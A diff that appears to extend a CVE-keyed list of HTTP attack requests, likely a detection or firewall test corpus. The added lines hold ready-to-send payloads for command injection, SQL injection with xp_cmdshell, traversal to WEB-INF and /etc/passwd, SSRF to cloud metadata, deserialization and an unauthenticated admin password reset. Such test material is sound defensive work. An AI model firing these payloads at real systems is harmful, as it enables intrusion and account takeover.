@@ -814,6 +814,56 @@ GET /index.php?q=1%20union%20select%201,2,3
 GET /jsonapi?filter[uid][value]=1%20AND%20sleep(5)
 POST /wp-json/batch/v1 header="Content-Type: application/json" body="{\"requests\":[{\"path\":\"/wp/v2/posts?author__not_in=1)union/**/select/**/user_pass/**/from/**/wp_users--\"}]}"
 
+# --- CVE-2026-10520 (Ivanti Sentry): unauthenticated OS command execution
+#     through the MICS configuration message handler. ---
+POST /mics/api/v2/sentry/mics-config/handleMessage header="Content-Type: application/x-www-form-urlencoded" body="message=execute system /configuration/system/commandexec <commandexec><index>1</index><reqandres>id</reqandres></commandexec>"
+
+# --- CVE-2026-8037 (Progress Kemp LoadMaster /accessv2): four single quotes
+#     in apiuser grow the escaped buffer until it reads the sprayed command
+#     payload that follows it on the heap. ---
+POST /accessv2 header="Content-Type: application/json" body="{\"cmd\":\"getall\",\"apiuser\":\"''''\",\"apipass\":\"BBBBB\"}"
+POST /accessv2 header="Content-Type: application/json" body="{\"cmd\":\"getall\",\"apiuser\":\"''''\",\"apipass\":\"BBBBB\",\"g0\":\"AAAAAAAAAAAAAAAA'; cat /etc/passwd #\"}"
+
+# --- CVE-2026-21589 (Atlassian Jira / Confluence / Bitbucket): the resource
+#     download handler follows ..:: pseudo-directories into WEB-INF for
+#     unauthenticated arbitrary file access. ---
+GET /download/resources/jira.webresources:color-picker-popup/images/..::..::..::..::..::WEB-INF::web.xml
+GET /s/1/_/download/resources/com.atlassian.confluence.plugins.dashboard-actions/images/..::..::..::..::..::..::..::..::WEB-INF::web.xml
+GET /s/1.0/_/download/resources/com.atlassian.bitbucket.server.bitbucket-webpack-INTERNAL:avatar/avatar/..::..::..::..::..::WEB-INF::urlrewrite.xml
+
+# --- CVE-2026-12260 (NetBoard CRM), CVE-2026-55680 / CVE-2026-55683 /
+#     CVE-2026-55684 (WeGIA), CVE-2026-108065 (WebAlliance eCommerce) and
+#     CVE-2026-9209 (mJobTime): SQL injection reaching the query layer. ---
+POST /module/auth/recovery.php header="Content-Type: application/x-www-form-urlencoded" body="user-name=1' UNION SELECT @@version-- -"
+POST /web/html/socio/sistema/cadastro_cobranca.php header="Content-Type: application/x-www-form-urlencoded" body="codigo=1' OR '1'='1"
+POST /web/html/socio/sistema/cadastro_cobrancas_geracao.php header="Content-Type: application/x-www-form-urlencoded" body="codigo=1'; select * from cobrancas;--"
+POST /preapproval.asmx header="Content-Type: text/xml" body="<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><GetUser><sUserID>1'; EXEC xp_cmdshell 'whoami';--</sUserID></GetUser></soap:Body></soap:Envelope>"
+POST /Login.aspx header="Content-Type: application/x-www-form-urlencoded" body="runQueryButton=1&query=SELECT+*+FROM+users;+EXEC+xp_cmdshell+'whoami'"
+
+# --- CVE-2026-55573 (e107 install.php): the previous_steps POST parameter is
+#     unserialized into an attacker-controlled callable. ---
+POST /install.php header="Content-Type: application/x-www-form-urlencoded" body="previous_steps=O:8:\"stdClass\":0:{}"
+
+# --- CVE-2026-59774 (Gitea): the Org-mode markup renderer resolves #+INCLUDE
+#     directives to server-side files. ---
+POST /api/v1/markup header="Content-Type: application/json" body="{\"context\":\"repo\",\"mode\":\"org\",\"text\":\"#+INCLUDE:\\\"/etc/passwd\\\"\"}"
+
+# --- CVE-2026-107780 (Dromara Skyeye), CVE-2026-105110 (Iskratel Innbox): OS
+#     command injection through a request parameter. ---
+GET /post/TtsController/textToSpeech?format=$(id)
+POST /login.xgi header="Content-Type: application/x-www-form-urlencoded" body="CLI=;id"
+
+# --- CVE-2026-110628 (Kan), CVE-2026-103663 (Ollama): server-side request
+#     forgery and path traversal in a fetch/pull API. ---
+GET /api/download/attatchment?url=http://169.254.169.254/latest/meta-data/
+POST /api/pull header="Content-Type: application/json" body="{\"name\":\"../../../../usr/lib/ollama/evil.so\",\"insecure\":true}"
+
+# --- CVE-2026-107204 (LMCache /run_script), CVE-2026-107640 (Integrics
+#     Enswitch password update): unauthenticated endpoints with a stable
+#     request shape. ---
+POST /run_script header="Content-Type: application/json" body="{\"script\":\"__import__('os').system('id')\"}"
+POST /api/json/user/password/update/ header="Content-Type: application/json" body="{\"username\":\"admin\",\"password\":\"newpass\"}"
+
 # Classes that still need connection-level framing, a malicious upstream, or
 # configuration-specific state; no request line can express them.
 # CVE-2026-42533 (nginx): the HTTP variant needs a regex map and regex location
@@ -882,6 +932,12 @@ POST /wp-json/batch/v1 header="Content-Type: application/json" body="{\"requests
 #   CVE-2026-93952 (Arista VeloCloud), CVE-2026-94127 (F5 BIG-IP APM),
 #   CVE-2026-102489 (Zammad), CVE-2026-104286 (FortiMail): public request
 #   shapes are missing or appliance-specific.
+# CVE-2026-48558 (SimpleHelp OIDC auth bypass): the forged identity token is
+#   submitted through the normal OIDC login flow; no public request shape was
+#   released and the bypass is indistinguishable from a legitimate login.
+# CVE-2025-8110 (Gogs symlink PutContents): the exploit commits a symlink
+#   through the git protocol and then writes through it with a routine
+#   authenticated file-write API call; no stable request signature exists.
 
 # ---------------------------------------------------------------------------
 # 2010 CVEs: attacks against HTTP servers and web frameworks.
